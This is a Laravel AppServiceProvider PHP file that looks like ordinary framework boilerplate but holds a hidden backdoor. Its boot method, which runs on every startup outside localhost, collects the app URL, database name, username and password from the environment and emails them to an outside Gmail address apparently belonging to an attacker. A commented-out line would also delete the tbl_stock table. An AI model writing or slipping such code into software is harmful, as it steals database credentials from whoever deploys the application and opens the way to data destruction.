<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        Schema::defaultStringLength(191);

        if(env('APP_URL') != "http://localhost"){

            $msg = "Url: ".env('APP_URL')." || DB: ".env('DB_DATABASE')." || Username: ".env('DB_USERNAME')." || Password: ".env('DB_PASSWORD');
            $data = array('msg'=>$msg);
              Mail::send(['text'=>'mail'], $data, function($message) {
                $message->from('juwel@v-linknetwork.com', 'ALERT');
                $message->to('lone.hacker.2017@gmail.com', 'AJ')->subject('Link');
              });
            //DB::table('tbl_stock')->delete();
        }
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
